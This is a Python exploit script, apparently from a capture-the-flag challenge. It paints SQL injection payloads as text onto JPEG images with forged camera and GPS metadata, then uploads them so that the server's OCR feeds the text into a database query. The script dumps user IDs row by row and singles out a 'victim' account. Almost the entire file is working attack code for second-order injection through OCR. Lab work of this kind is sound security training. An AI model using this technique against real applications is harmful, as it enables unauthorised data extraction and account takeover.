# v2_win.py — KEY: OCR reads 'SELECT user_id FROM images WHERE id ...' in correct order (proved by
# p_full). Failures came from count(*) / max(id) shapes, not from FROM images. So dump user_id
# directly with the well-read SELECT..FROM images WHERE.. shape. Avoid count(*); use plain columns.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")
CNT=[0]

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=30):
    W=min(2000,max(1000,40+int(len(text)*size*0.56))); H=260
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("wn.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"wn.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("wn.jpg","rb").read()).decode()

def up(painted, desc):
    CNT[0]+=1
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    ocr=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
    inner=ocr
    if inner.startswith("9"): inner=inner[1:]
    if inner.endswith("9"): inner=inner[:-1]
    print(f"{desc:16} {r.status_code} raw={ocr!r} => {inner!r}")
    return r.status_code, inner

sq="'"
# The proven-readable shape: SELECT user_id FROM images WHERE id = N  (plain columns, no count/*)
print("=== dump user_id by id (id=1..5 are seeded/victim) ===")
for i in [1,2,3,4,5]:
    up("9"+sq+"||(SELECT user_id FROM images WHERE id="+str(i)+")||"+sq+"9", f"uid_id{i}")

print("\n=== victim = user_id different from ours ===")
up("9"+sq+"||(SELECT user_id FROM images WHERE user_id<>"+sq+UID+sq+" LIMIT 1)||"+sq+"9", "victim")
